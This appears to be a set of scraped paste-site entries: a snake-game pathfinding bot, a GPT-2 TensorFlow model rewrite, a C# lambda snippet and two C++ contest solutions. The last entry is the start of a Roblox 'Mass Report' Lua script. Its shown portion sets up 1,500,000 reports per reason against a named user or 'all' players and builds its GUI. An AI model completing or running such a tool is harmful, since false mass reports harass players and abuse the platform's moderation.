    for _ in range(world_size):
        row = []
        for _ in range(world_size):
            row.append(False)
        visited_grid.append(row)
    
    # 蛇的身体是障碍物
    for segment in snake_body:
        visited_grid[segment[1]][segment[0]] = True

    if find_path_recursive(start_x, start_y):
        return path_solution
    else:
        return None

# ------------------------------------------------------------------------------
# 主游戏逻辑
# ------------------------------------------------------------------------------

def play_dinosaur_game():
    if not setup_game():
        change_hat(Hats.Green_Hat) # 如果设置失败，换回绿帽以重置状态
        return

    snake_body = [[get_pos_x(), get_pos_y()]]
    game_over = False

    while not game_over:
        # 此时无人机正位于一个苹果上，安全调用 measure()
        measured_pos = measure()
        if not measured_pos:
            quick_print(""错误: measure() 未返回位置。可能是游戏结束的信号。"")
            break
        
        target_x, target_y = measured_pos
        quick_print(""下一个苹果在: ("" + str(target_x) + "", "" + str(target_y) + "")"")
        
        # 第一次寻路，规划从当前苹果到下一个苹果的完整路径
        head_x, head_y = snake_body[0]
        path = find_path_to_apple(head_x, head_y, target_x, target_y, snake_body)

        if not path:
            quick_print(""被困住了！找不到初始路径。游戏结束。"")
            break

        # 吃掉当前苹果并开始移动
        # 移动第一步，意味着“吃掉”了脚下的苹果，尾巴需要增长
        direction_to_move = path[0]
        if move(direction_to_move):
            new_head_x, new_head_y = get_pos_x(), get_pos_y()
            snake_body.insert(0, [new_head_x, new_head_y])
            # 尾巴增长：不执行 snake_body.pop()
            quick_print(""吃到苹果！尾巴长度: "" + str(len(snake_body)))
        else:
            quick_print(""错误：初始移动失败。"")
            break
            
        # 循环移动，直到到达目标苹果
        while get_pos_x() != target_x or get_pos_y() != target_y:
            # 动态寻路：每一步都重新计算路径，因为蛇身在移动
            head_x, head_y = snake_body[0]
            current_path = find_path_to_apple(head_x, head_y, target_x, target_y, snake_body)
            
            if not current_path:
                quick_print(""移动途中被困住！找不到路径。游戏结束。"")
                game_over = True
                break

            direction_to_move = current_path[0]
            if move(direction_to_move):
                new_head_x, new_head_y = get_pos_x(), get_pos_y()
                snake_body.insert(0, [new_head_x, new_head_y])
                snake_body.pop() # 正常移动，尾巴前进
            else:
                quick_print(""错误：中途移动失败，路径规划可能出错。"")
                game_over = True
                break
        
        if game_over:
            break

        # 检查是否已满
        if len(snake_body) >= get_world_size() * get_world_size():
            quick_print(""恭喜！填满了整个地图！"")
            break

    # 游戏结束，收获骨头
    tail_length = len(snake_body)
    bones_earned = tail_length * tail_length
    quick_print(""最终尾巴长度: "" + str(tail_length))
    quick_print(""预计获得骨头: "" + str(bones_earned))
    
    quick_print(""正在更换帽子以收获骨头..."")
    change_hat(Hats.Green_Hat) # 换掉帽子以收获
    quick_print(""收获完成！"")


# ==============================================================================
# 主函数
# ==============================================================================

def main():
    while True:
        play_dinosaur_game()
        quick_print(""======== 完成一轮恐龙挑战，准备开始下一轮... ========"")

if __name__ == ""__main__"":
    main()
"
vhVBrAWs,(GPT-2 sorce code optimization) model.py,Jayden12092012,Python,Sunday 19th of October 2025 01:39:31 AM CDT,"import numpy as np
import tensorflow.compat.v1 as tf
# Note: tensorflow.compat.v1 is used to maintain compatibility with original tf.variable_scope and tf.get_variable usage.
# For a full modern TF2 refactor, the variable/scope handling would be replaced with tf.keras.layers and tf.Module.
from tensorflow.contrib.training import HParams

# ----------------------------------------------------------------------
# Helper Functions
# ----------------------------------------------------------------------

def create_default_hparams():
    """"""Returns a set of default hyperparameters for the GPT model.""""""
    return HParams(
        n_vocab=0,
        n_ctx=1024,
        n_embd=768,
        n_head=12,
        n_layer=12,
    )

def get_shape_list(tensor):
    """"""
    Computes a list of the dimensions of the tensor, handling dynamic shapes.

    Args:
        tensor: A tf.Tensor.

    Returns:
        A list of integers or tf.Tensor representing the shape.
    """"""
    static_shape = tensor.shape.as_list()
    dynamic_shape = tf.shape(tensor)
    return [
        dynamic_shape[i] if s is None else s
        for i, s in enumerate(static_shape)
    ]

# Optimized Softmax: Uses tf.nn.softmax, which is optimized internally.
def stable_softmax(x, axis=-1):
    """"""Applies a numerically stable softmax function.""""""
    return tf.nn.softmax(x, axis=axis)

# Activation Function: GeLU (Gaussian Error Linear Unit)
# Optimized GeLU: Use the more numerically stable and standardized approximation.
def gelu_activation(x):
    """"""
    Gaussian Error Linear Unit (GELU) activation function.
    Reference: https://arxiv.org/abs/1606.08415
    """"""
    # Use the standard TF approximation which is optimized
    return 0.5 * x * (1.0 + tf.tanh(np.sqrt(2.0 / np.pi) * (x + 0.044715 * tf.pow(x, 3))))

def layer_norm(x, scope, *, axis=-1, epsilon=1e-5):
    """"""
    Applies Layer Normalization.

    Normalize to mean = 0, std = 1, then do a diagonal affine transform (gamma*x + beta).
    """"""
    with tf.variable_scope(scope, reuse=tf.AUTO_REUSE):
        num_channels = get_shape_list(x)[-1]
        
        # Gamma (g) and Beta (b)
        gamma = tf.get_variable('gamma', [num_channels], initializer=tf.constant_initializer(1.0))
        beta = tf.get_variable('beta', [num_channels], initializer=tf.constant_initializer(0.0))

        # Use tf.nn.moments for mean and variance calculation, often more stable
        mean, variance = tf.nn.moments(x, axes=[axis], keep_dims=True)
        
        # Normalization and Affine Transform
        normalized_x = (x - mean) * tf.rsqrt(variance + epsilon)
        output = normalized_x * gamma + beta
        return output

def split_channels(x, num_splits):
    """"""
    Reshapes the last dimension of x into [num_splits, original_dim/num_splits].
    Used to split the features dimension into (heads, features_per_head).
    """"""
    *start, dim = get_shape_list(x)
    return tf.reshape(x, start + [num_splits, dim // num_splits])

def merge_channels(x):
    """"""
    Smash the last two dimensions of x into a single dimension.
    Used to merge (heads, features_per_head) back into the features dimension.
    """"""
    *start, dim_a, dim_b = get_shape_list(x)
    return tf.reshape(x, start + [dim_a * dim_b])

def conv1d_layer(x, scope, output_channels, *, w_init_stdev=0.02):
    """"""
    Performs a 1D convolution (equivalent to a fully connected layer
    applied element-wise over the sequence dimension).
    """"""
    with tf.variable_scope(scope, reuse=tf.AUTO_REUSE):
        *start, input_channels = get_shape_list(x)
        
        # Weight matrix W (Kernel size 1, Input channels, Output channels)
        weight = tf.get_variable('w', [1, input_channels, output_channels], 
                                 initializer=tf.random_normal_initializer(stddev=w_init_stdev))
        # Bias vector b
        bias = tf.get_variable('b', [output_channels], initializer=tf.constant_initializer(0.0))
        
        # Use tf.nn.conv1d for optimized convolution operation
        # This is generally faster and clearer than reshaping and using tf.matmul
        conved = tf.nn.conv1d(x, weight, stride=1, padding='VALID') 
        output = conved + bias
        
        # Reshape back to the original start dimensions + output_channels
        return tf.reshape(output, start + [output_channels])

def create_attention_mask(dest_len, source_len, *, dtype):
    """"""
    Creates a causal mask (look-ahead mask) for the self-attention mechanism.
    1's in the lower triangle, counting from the lower right corner.
    """"""
    i = tf.range(dest_len)[:, None]
    j = tf.range(source_len)
    
    # Condition for causality: i >= j - source_len + dest_len
    # Ensures a token at index 'i' can only attend to tokens at 'j' where j <= i
    mask = i >= j - source_len + dest_len
    return tf.cast(mask, dtype)

# ----------------------------------------------------------------------
# Core Model Components
# ----------------------------------------------------------------------

def attention(x, scope, num_state, *, past_key_value, hparams):
    """"""Multi-head attention mechanism.""""""
    
    def split_heads(tensor):
        # [batch, sequence, features] -> [batch, heads, sequence, features_per_head]
        return tf.transpose(split_channels(tensor, hparams.n_head), [0, 2, 1, 3])

    def merge_heads(tensor):
        # [batch, heads, sequence, features_per_head] -> [batch, sequence, features]
        return merge_channels(tf.transpose(tensor, [0, 2, 1, 3]))

    def apply_causal_mask(attention_weights):
        # attention_weights shape: [batch, heads, dest_sequence, src_sequence]
        _, _, dest_len, src_len = get_shape_list(attention_weights)
        
        causal_mask = create_attention_mask(dest_len, src_len, dtype=attention_weights.dtype)
        # Reshape to broadcast across batch and heads: [1, 1, dest_len, src_len]
        causal_mask = tf.reshape(causal_mask, [1, 1, dest_len, src_len])
        
        # Apply the mask: set scores to a very small number if mask is 0
        very_negative_value = -1e10 # Use a specific float value for clarity
        masked_weights = attention_weights * causal_mask + very_negative_value * (1.0 - causal_mask)
        return masked_weights

    def multihead_dot_product_attention(query, key, value):
        # Query, Key, Value shape: [batch, heads, sequence, features_per_head]
        
        # 1. Scaled Dot Product: W = Q * K^T / sqrt(d_k)
        attention_logits = tf.matmul(query, key, transpose_b=True)
        feature_dim = tf.cast(get_shape_list(value)[-1], attention_logits.dtype)
        attention_logits = attention_logits * tf.rsqrt(feature_dim)

        # 2. Causal Masking
        attention_logits = apply_causal_mask(attention_logits)
        
        # 3. Softmax
        attention_weights = stable_softmax(attention_logits)
        
        # 4. Output: A = W * V
        output_attention = tf.matmul(attention_weights, value)
        return output_attention

    with tf.variable_scope(scope, reuse=tf.AUTO_REUSE):
        # 1. Project to Q, K, V
        # Total output channels: num_state * 3 (for Q, K, V)
        qkv_projection = conv1d_layer(x, 'c_attn', num_state * 3)
        
        # 2. Split into Q, K, V and then split heads
        query, key, value = map(split_heads, tf.split(qkv_projection, 3, axis=2))
        
        # 3. Handle Past Key/Value (KV-Caching)
        current_present = tf.stack([key, value], axis=1) # [batch, 2, heads, sequence, features_per_head]
        if past_key_value is not None:
            # past_key_value shape: [batch, 2, heads, past_sequence, features_per_head]
            past_key, past_value = tf.unstack(past_key_value, axis=1)
            # Concatenate past and current sequences along the sequence dimension (-2)
            key = tf.concat([past_key, key], axis=-2)
            value = tf.concat([past_value, value], axis=-2)
            
        # 4. Multi-Head Attention
        attention_output = multihead_dot_product_attention(query, key, value)
        
        # 5. Merge Heads
        attention_output = merge_heads(attention_output)
        
        # 6. Final Linear Projection (Output Projection)
        final_output = conv1d_layer(attention_output, 'c_proj', num_state)
        
        return final_output, current_present


def feed_forward_network(x, scope, intermediate_state_size, *, hparams):
    """"""Position-wise Feed-Forward Network.""""""
    with tf.variable_scope(scope, reuse=tf.AUTO_REUSE):
        # Input features dimension (nx)
        input_dim = get_shape_list(x)[-1]
        
        # 1. First Linear Layer (Expansion) and GeLU Activation
        hidden_layer = gelu_activation(conv1d_layer(x, 'c_fc', intermediate_state_size))
        
        # 2. Second Linear Layer (Contraction)
        output_layer = conv1d_layer(hidden_layer, 'c_proj', input_dim)
        return output_layer


def transformer_block(x, scope, *, past_key_value, hparams):
    """"""A single Transformer block (Attention + FFN with Layer Norm and Residual Connections).""""""
    with tf.variable_scope(scope, reuse=tf.AUTO_REUSE):
        num_state = get_shape_list(x)[-1]
        
        # --- 1. Attention Sub-layer (with pre-normalization) ---
        # LayerNorm -> Attention -> Residual Connection
        norm_x_attn = layer_norm(x, 'ln_1')
        attn_output, present_kv = attention(
            norm_x_attn, 'attn', num_state, past_key_value=past_key_value, hparams=hparams
        )
        x = x + attn_output # Residual Connection 1
        
        # --- 2. Feed-Forward Sub-layer (with pre-normalization) ---
        # LayerNorm -> FFN -> Residual Connection
        norm_x_mlp = layer_norm(x, 'ln_2')
        # FFN intermediate size is typically 4 times the model dimension (num_state * 4)
        mlp_output = feed_forward_network(norm_x_mlp, 'mlp', num_state * 4, hparams=hparams)
        x = x + mlp_output # Residual Connection 2
        
        return x, present_kv

# ----------------------------------------------------------------------
# Model Utilities and Main Function
# ----------------------------------------------------------------------

def calculate_past_shape(*, hparams, batch_size=None, sequence_length=None):
    """"""Computes the expected shape of the past_key_value tensor.""""""
    # Shape: [batch, n_layer, 2 (k/v), n_head, sequence, features_per_head]
    features_per_head = hparams.n_embd // hparams.n_head
    return [
        batch_size, 
        hparams.n_layer, 
        2, 
        hparams.n_head, 
        sequence_length, 
        features_per_head
    ]

def tile_for_batch(value, batch_size):
    """"""Adds a new batch axis and tiles the value to the given batch_size.""""""
    value = tf.convert_to_tensor(value, name='value')
    ndims = value.shape.ndims
    # Tile along the new 0th axis
    return tf.tile(tf.expand_dims(value, axis=0), [batch_size] + [1] * ndims)

def calculate_position_indices(token_input, past_length_value):
    """"""Calculates position indices for positional embedding.""""""
    batch_size = tf.shape(token_input)[0]
    sequence_length = tf.shape(token_input)[1]
    
    # Position indices = past_length + [0, 1, 2, ..., sequence_length - 1]
    position_range = past_length_value + tf.range(sequence_length)
    return tile_for_batch(position_range, batch_size)


def gpt_model(hparams, input_tokens, past_key_value=None, scope='model', reuse=False):
    """"""
    GPT-style transformer model for language modeling.

    Args:
        hparams: Hyperparameters object.
        input_tokens: Input tensor of token IDs, shape [batch, sequence].
        past_key_value: Cached K/V states for incremental decoding, shape 
                        [batch, n_layer, 2, n_head, past_sequence, features_per_head].
        scope: Variable scope name.
        reuse: Boolean for variable reuse.

    Returns:
        A dictionary with 'logits' and 'present' (updated K/V cache).
    """"""
    
    # Use tf.compat.v1.variable_scope and tf.compat.v1.get_variable 
    # for compatibility with the original TensorFlow 1.x structure.
    with tf.variable_scope(scope, reuse=reuse):
        results = {}
        batch_size, sequence_length = get_shape_list(input_tokens)

        # 1. Embeddings (Word Token + Positional)
        # Positional Embedding (WPE)
        wpe = tf.get_variable('wpe', [hparams.n_ctx, hparams.n_embd],
                             initializer=tf.random_normal_initializer(stddev=0.01))
        # Token Embedding (WTE) - also serves as the final projection matrix
        wte = tf.get_variable('wte', [hparams.n_vocab, hparams.n_embd],
                             initializer=tf.random_normal_initializer(stddev=0.02))
        
        # Calculate past length for correct positional encoding offset
        past_length = 0 if past_key_value is None else tf.shape(past_key_value)[-2]
        
        # Token Embeddings: h = WTE[X]
        token_embeddings = tf.gather(wte, input_tokens)
        # Positional Embeddings: WPE[positions_for(X)]
        position_indices = calculate_position_indices(input_tokens, past_length)
        position_embeddings = tf.gather(wpe, position_indices)
        
        # Final combined embedding
        hidden_state = token_embeddings + position_embeddings

        # 2. Transformer Blocks (The Core)
        present_key_values = []
        # Unstack past K/V cache into a list of (K, V) pairs per layer
        pasts_per_layer = tf.unstack(past_key_value, axis=1) if past_key_value is not None else [None] * hparams.n_layer
        assert len(pasts_per_layer) == hparams.n_layer
        
        for layer_idx, layer_past_kv in enumerate(pasts_per_layer):
            hidden_state, present_kv = transformer_block(
                hidden_state, 'h%d' % layer_idx, past_key_value=layer_past_kv, hparams=hparams
            )
            present_key_values.append(present_kv)
            
        # Stack all layer presents back together
        results['present'] = tf.stack(present_key_values, axis=1) # Shape: [batch, n_layer, 2, n_head, sequence, features_per_head]
        
        # 3. Final Layer Normalization
        hidden_state = layer_norm(hidden_state, 'ln_f')

        # 4. Language Model Head (Logits)
        # Logits = H * WTE^T
        # Flatten the sequence and batch dimensions for matrix multiplication
        h_flat = tf.reshape(hidden_state, [batch_size * sequence_length, hparams.n_embd])
        
        # Transpose WTE (embedding matrix) to get the final projection matrix
        logits = tf.matmul(h_flat, wte, transpose_b=True)
        
        # Reshape logits back to [batch, sequence, n_vocab]
        logits = tf.reshape(logits, [batch_size, sequence_length, hparams.n_vocab])
        results['logits'] = logits
        
        return results"
PYxfzi84,LambdaFormsInC#–ExpressionVsStatementBodies,wingman007,C#,Sunday 19th of October 2025 12:37:18 AM CDT,"// ✅ Named method – complex logic
static int Factorial(int n)
{
    int result = 1;
    for (int i = 2; i <= n; i++)
        result *= i;
    return result;
}

// ✅ Named expression-bodied method – simple logic
static int Square(int x) => x * x;

// ✅ Anonymous lambda – expression-bodied
Func<int, int> addOne = x => x + 1;

// ✅ Anonymous lambda – statement-bodied
Func<int, int> addOneVerbose = x =>
{
    int y = x + 1;
    return y; // must return explicitly
};
"
wa27cDYG,Untitled,cosenza987,C++,Saturday 18th of October 2025 10:25:22 PM CDT,"//Слава Україні, Героям слава

#include <bits/stdc++.h>

using namespace std;

using ll = long long;

struct point {
    ll x, y;
    point(ll x_ = 0, ll y_ = 0) : x(x_), y(y_) {}
    point operator -(point p) {
        return point(x - p.x, y - p.y);
    }
    bool operator == (const point &p) const {
        return x == p.x and y == p.y;
    }
    bool operator < (const point &p) const {
        return (x < p.x) or (x == p.x and y < p.y);
    }
    ll operator %(point p) {
        return x * p.y - y * p.x;
    }
    bool on_seg(point p, point q) {
        if(this->dir(p, q)) return false;
        return (x > min(p.x, q.x)) and (x < max(p.x, q.x)) and (y > min(p.y, q.y)) and (y < max(p.y, q.y));
    }
    long double dist (const point &p) const {
        return hypotl(x - p.x, y - p.y);
    }
    ll dist2 (const point &p) const {
        return (x - p.x) * (x - p.x) + (y - p.y) * (y - p.y);
    }
    int dir(point origin, point other) {
        ll d = (*this - origin) % (other - origin);
        return (d > 0) - (d < 0);
    }
};
 
ll cross(point p, point q) {
    return p.x * q.y - p.y * q.x;
}
 
ll area_2(point a, point b, point c) {
    return cross(a, b) + cross(b, c) + cross(c, a);
}

void monotone_hull(vector<point> &pts) {
    sort(pts.begin(), pts.end());
    pts.erase(unique(pts.begin(), pts.end()), pts.end());
    vector<point> up, dn;
    for(int i = 0; i < pts.size(); i++) {
        while(up.size() > 1 and area_2(up[up.size() - 2], up.back(), pts[i]) > 0) up.pop_back();
        while(dn.size() > 1 and area_2(dn[dn.size() - 2], dn.back(), pts[i]) < 0) dn.pop_back();
        dn.push_back(pts[i]);
        up.push_back(pts[i]);
    }
    pts = dn;
    for(int i = (int)up.size() - 2; i >= 1; i--) {
        pts.push_back(up[i]);
    }
}

int direction(point origin, point p, point other) {
    return p.dir(origin, other);
}

bool segment_segment_intersect(point a, point b, point c, point d) {
    if(a.dist2(c) == 0 or a.dist2(d) == 0 or b.dist2(c) == 0 or b.dist2(d) == 0) return true;
    ll d1 = direction(a, b, c);
    ll d2 = direction(a, b, d);
    ll d3 = direction(c, d, a);
    ll d4 = direction(c, d, b);
    if(d1 * d2 < 0 and d3 * d4 < 0) return true;
    return a.on_seg(c, d) or b.on_seg(c, d) or c.on_seg(a, b) or d.on_seg(a, b);
}

int main() {
    ios_base::sync_with_stdio(false);
    cin.tie(nullptr);
    cout << setprecision(6) << fixed;
    int t;
    cin >> t;
    while(t--) {
        int n;
        cin >> n;
        vector<pair<array<point, 4>, int>> v(n);
        vector<point> pts;
        for(auto &[arr, h] : v) {
            for(int i = 0; i < 4; i++) {
                cin >> arr[i].x >> arr[i].y;
                pts.emplace_back(arr[i]);
            }
            cin >> h;
        }
        monotone_hull(pts);
        long double perimeter = 0;
        for(int i = 0; i < (int)pts.size(); i++) {
            perimeter += pts[i].dist(pts[(i + 1) % pts.size()]);
        }
        int h = 3;
        for(int i = 0; i < (int)pts.size(); i++) for(int j = i + 1; j < (int)pts.size(); j++) {
            for(int k = 0; k < n; k++) {
                for(int ii = 0; ii < 4; ii++) for(int jj = ii + 1; jj < 4; jj++) {
                    if(segment_segment_intersect(pts[i], pts[j], v[k].first[ii], v[k].first[jj])) {
                        h = max(h, v[k].second + 1);
                    }
                }
            }
        }
        cout << perimeter << "" "" << h << ""\n"";
    }
    return 0;
}"
NYFTPe60,Untitled,cosenza987,C++,Saturday 18th of October 2025 09:31:30 PM CDT,"//Слава Україні, Героям слава

#include <bits/stdc++.h>

using namespace std;

const int N = 105;
typedef vector<bitset<N>> graph;
#define sz(v) (int)v.size()
struct Maxclique {
    double limit = 0.025, pk = 0;
    struct Vertex {
        int i, d = 0;
    };
    typedef vector<Vertex> vv;
    graph e;
    vv V;
    vector<vector<int>> C;
    vector<int> qmax, q, S, old;
    void init(vv& r) {
        for (auto& v : r) v.d = 0;
        for (auto& v : r) for (auto j : r) v.d += e[v.i][j.i];
        sort(r.begin(), r.end(), [](auto a, auto b) {
            return a.d > b.d;
            });
        int mxD = r[0].d;
        for (int i = 0; i < sz(r); i++) r[i].d = min(i, mxD) + 1;
    }
    void expand(vv& R, int lev = 1) {
        S[lev] += S[lev - 1] - old[lev];
        old[lev] = S[lev - 1];
        while (sz(R)) {
            if (sz(q) + R.back().d <= sz(qmax)) return;
            q.push_back(R.back().i);
            vv T;
            for (auto v : R) if (e[R.back().i][v.i]) T.push_back({ v.i });
            if (sz(T)) {
                if (S[lev]++ / ++pk < limit) init(T);
                int j = 0, mxk = 1, mnk = max(sz(qmax) - sz(q) + 1, 1);
                C[1].clear(), C[2].clear();
                for (auto v : T) {
                    int k = 1;
                    auto f = [&](int i) {
                        return e[v.i][i];
                        };
                    while (any_of(C[k].begin(), C[k].end(), f)) k++;
                    if (k > mxk) mxk = k, C[mxk + 1].clear();
                    if (k < mnk) T[j++].i = v.i;
                    C[k].push_back(v.i);
                }
                if (j > 0) T[j - 1].d = 0;
                for (int k = mnk; k <= mxk; k++) for (int i : C[k])
                    T[j].i = i, T[j++].d = k;
                expand(T, lev + 1);
            }
            else if (sz(q) > sz(qmax)) qmax = q;
            q.pop_back(), R.pop_back();
        }
    }
    Maxclique(graph g) : e(g), C(sz(e) + 1), S(sz(C)), old(S) {
        for (int i = 0; i < sz(e); i++) V.push_back({ i });
    }
    vector<int> solve() { // returns the clique
        init(V), expand(V);
        return qmax;
    }
};

int main() {
    ios_base::sync_with_stdio(false);
    cin.tie(nullptr);
    int n;
    while(cin >> n) {
        if(n == 0) break;
        vector<long long> v(n);
        for(auto &e : v) cin >> e;
        vector<long long> adj(n);
        graph g(n);
        for(int i = 0; i < n; i++) for(int j = i + 1; j < n; j++) if(__gcd(v[i], v[j]) != 1) g[i][j] = g[j][i] = 1;
        Maxclique M(g);
        cout << M.solve().size() << ""\n"";
    }
    return 0;
}
"
QVpev2dV,"Universal: Auto Report, Mass Report",lcr999x,Lua,Saturday 18th of October 2025 06:31:21 PM CDT,"local UserInputService = game:GetService(""UserInputService"")
local TweenService = game:GetService(""TweenService"")

local TARGET = ""all""
local REPORTS_PER_REASON = 1500000
local DELAY = 0.001
local WHITELIST = {} -- Will be populated from GUI
local REPORT_TYPES = {
    ""Text"",
    ""Avatar"", 
    ""VoiceChat""
}

local REASONS = {
    ""Cheating"",
    ""Exploiting"",
    ""Scamming"",
    ""Harassment"",
    ""Swearing"",
    ""Bullying"",
    ""InappropriateContent"",
    ""PersonalInfo"",
    ""Dating"",
    ""Phishing""
}

local ScreenGui = Instance.new(""ScreenGui"")
ScreenGui.Name = ""MassReportGUI""
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.Parent = game:GetService(""CoreGui"")

local MainFrame = Instance.new(""Frame"")
MainFrame.Name = ""MainFrame""
MainFrame.Size = UDim2.new(0, 380, 0, 550)
MainFrame.Position = UDim2.new(0.5, -190, 0.5, 50)
MainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
MainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
MainFrame.BackgroundTransparency = 0.1
MainFrame.BorderSizePixel = 0
MainFrame.ClipsDescendants = true
MainFrame.Parent = ScreenGui

local UICorner = Instance.new(""UICorner"")
UICorner.CornerRadius = UDim.new(0, 12)
UICorner.Parent = MainFrame

local UIStroke = Instance.new(""UIStroke"")
UIStroke.Color = Color3.fromRGB(220, 20, 60)
UIStroke.Thickness = 3
UIStroke.Parent = MainFrame

local DropShadow = Instance.new(""ImageLabel"")
DropShadow.Name = ""DropShadow""
DropShadow.AnchorPoint = Vector2.new(0.5, 0.5)
DropShadow.BackgroundTransparency = 1
DropShadow.BorderSizePixel = 0
DropShadow.Position = UDim2.new(0.5, 0, 0.5, 6)
DropShadow.Size = UDim2.new(1, 15, 1, 15)
DropShadow.Image = ""rbxassetid://1316045217""
DropShadow.ImageColor3 = Color3.fromRGB(220, 20, 60)
DropShadow.ImageTransparency = 0.7
DropShadow.ScaleType = Enum.ScaleType.Slice
DropShadow.SliceCenter = Rect.new(10, 10, 118, 118)
DropShadow.Parent = MainFrame

local Title = Instance.new(""TextLabel"")
Title.Name = ""Title""
Title.Size = UDim2.new(1, 0, 0, 50)
Title.Position = UDim2.new(0, 0, 0, 0)
Title.BackgroundColor3 = Color3.fromRGB(220, 20, 60)
Title.BackgroundTransparency = 0
Title.BorderSizePixel = 0
Title.Font = Enum.Font.GothamBold
Title.Text = ""⚔ MASS REPORT v2.0 ⚔""
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.TextSize = 20
Title.TextXAlignment = Enum.TextXAlignment.Center
Title.Parent = MainFrame

local TitleCorner = Instance.new(""UICorner"")
TitleCorner.CornerRadius = UDim.new(0, 12)
TitleCorner.Parent = Title

local CloseButton = Instance.new(""TextButton"")
CloseButton.Name = ""CloseButton""
CloseButton.Size = UDim2.new(0, 35, 0, 35)
CloseButton.Position = UDim2.new(1, -40, 0, 7)
CloseButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
CloseButton.BackgroundTransparency = 0.2
CloseButton.BorderSizePixel = 0
CloseButton.Font = Enum.Font.GothamBold
CloseButton.Text = ""✕""
CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
CloseButton.TextSize = 18
CloseButton.Parent = Title

local CloseButtonCorner = Instance.new(""UICorner"")
CloseButtonCorner.CornerRadius = UDim.new(0, 6)
CloseButtonCorner.Parent = CloseButton

local TargetFrame = Instance.new(""Frame"")
TargetFrame.Name = ""TargetFrame""
TargetFrame.Size = UDim2.new(1, -20, 0, 70)
TargetFrame.Position = UDim2.new(0, 10, 0, 60)
TargetFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
TargetFrame.BackgroundTransparency = 0.2
TargetFrame.BorderSizePixel = 0
TargetFrame.Parent = MainFrame

local TargetCorner = Instance.new(""UICorner"")
TargetCorner.CornerRadius = UDim.new(0, 8)
TargetCorner.Parent = TargetFrame

local TargetStroke = Instance.new(""UIStroke"")
TargetStroke.Color = Color3.fromRGB(220, 20, 60)
TargetStroke.Thickness = 2
TargetStroke.Parent = TargetFrame

local TargetLabel = Instance.new(""TextLabel"")
TargetLabel.Name = ""TargetLabel""
TargetLabel.Size = UDim2.new(1, -20, 0, 20)
TargetLabel.Position = UDim2.new(0, 10, 0, 5)
TargetLabel.BackgroundTransparency = 1
TargetLabel.Font = Enum.Font.GothamBold
TargetLabel.Text = ""🎯 Target (or 'all' for everyone):""
TargetLabel.TextColor3 = Color3.fromRGB(220, 20, 60)
TargetLabel.TextSize = 14
TargetLabel.TextXAlignment = Enum.TextXAlignment.Left
TargetLabel.Parent = TargetFrame

local TargetBox = Instance.new(""TextBox"")
TargetBox.Name = ""TargetBox""
TargetBox.Size = UDim2.new(1, -20, 0, 35)
TargetBox.Position = UDim2.new(0, 10, 0, 28)
TargetBox.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
TargetBox.BackgroundTransparency = 0.3
TargetBox.BorderSizePixel = 0
TargetBox.Font = Enum.Font.Gotham
TargetBox.PlaceholderText = ""Enter username here...""
TargetBox.Text = TARGET
TargetBox.TextColor3 = Color3.fromRGB(255, 255, 255)
TargetBox.TextSize = 14
TargetBox.TextXAlignment = Enum.TextXAlignment.Left
TargetBox.Parent = TargetFrame

local TargetBoxCorner = Instance.new(""UICorner"")
TargetBoxCorner.CornerRadius = UDim.new(0, 5)
TargetBoxCorner.Parent = TargetBox

local TargetBoxPadding = Instance.new(""UIPadding"")
TargetBoxPadding.PaddingLeft = UDim.new(0, 10)
TargetBoxPadding.Parent = TargetBox

local SettingsFrame = Instance.new(""Frame"")
SettingsFrame.Name = ""SettingsFrame""
SettingsFrame.Size = UDim2.new(1, -20, 0, 95)
SettingsFrame.Position = UDim2.new(0, 10, 0, 140)
SettingsFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
SettingsFrame.BackgroundTransparency = 0.2
SettingsFrame.BorderSizePixel = 0
SettingsFrame.Parent = MainFrame

local SettingsCorner = Instance.new(""UICorner"")
SettingsCorner.CornerRadius = UDim.new(0, 8)
SettingsCorner.Parent = SettingsFrame

local SettingsStroke = Instance.new(""UIStroke"")
SettingsStroke.Color = Color3.fromRGB(220, 20, 60)
SettingsStroke.Thickness = 2
SettingsStroke.Parent = SettingsFrame

local CountLabel = Instance.new(""TextLabel"")
CountLabel.Name = ""CountLabel""
CountLabel.Size = UDim2.new(0.5, -10, 0, 18)
CountLabel.Position = UDim2.new(0, 10, 0, 5)
CountLabel.BackgroundTransparency = 1
CountLabel.Font = Enum.Font.GothamBold
CountLabel.Text = ""Reports per Reason:""
CountLabel.TextColor3 = Color3.fromRGB(220, 20, 60)
CountLabel.TextSize = 12
CountLabel.TextXAlignment = Enum.TextXAlignment.Left
CountLabel.Parent = SettingsFrame

local CountBox = Instance.new(""TextBox"")
CountBox.Name = ""CountBox""
CountBox.Size = UDim2.new(0.5, -15, 0, 28)
CountBox.Position = UDim2.new(0, 10, 0, 25)
CountBox.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
CountBox.BackgroundTransparency = 0.3
CountBox.BorderSizePixel = 0
CountBox.Font = Enum.Font.Gotham
CountBox.PlaceholderText = ""Count""
CountBox.Text = tostring(REPORTS_PER_REASON)
CountBox.TextColor3 = Color3.fromRGB(255, 255, 255)
CountBox.TextSize = 12
CountBox.Parent = SettingsFrame

local CountBoxCorner = Instance.new(""UICorner"")
CountBoxCorner.CornerRadius = UDim.new(0, 4)
CountBoxCorner.Parent = CountBox

local CountBoxPadding = Instance.new(""UIPadding"")
CountBoxPadding.PaddingLeft = UDim.new(0, 8)
CountBoxPadding.Parent = CountBox

local DelayLabel = Instance.new(""TextLabel"")
DelayLabel.Name = ""DelayLabel""
DelayLabel.Size = UDim2.new(0.5, -10, 0, 18)
DelayLabel.Position = UDim2.new(0.5, 5, 0, 5)
DelayLabel.BackgroundTransparency = 1
DelayLabel.Font = Enum.Font.GothamBold
DelayLabel.Text = ""Delay (seconds):""
DelayLabel.TextColor3 = Color3.fromRGB(220, 20, 60)
DelayLabel.TextSize = 12
DelayLabel.TextXAlignment = Enum.TextXAlignment.Left
DelayLabel.Parent = SettingsFrame

local DelayBox = Instance.new(""TextBox"")
DelayBox.Name = ""DelayBox""
DelayBox.Size = UDim2.new(0.5, -15, 0, 28)
DelayBox.Position = UDim2.new(0.5, 5, 0, 25)
DelayBox.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
DelayBox.BackgroundTransparency = 0.3
DelayBox.BorderSizePixel = 0
DelayBox.Font = Enum.Font.Gotham
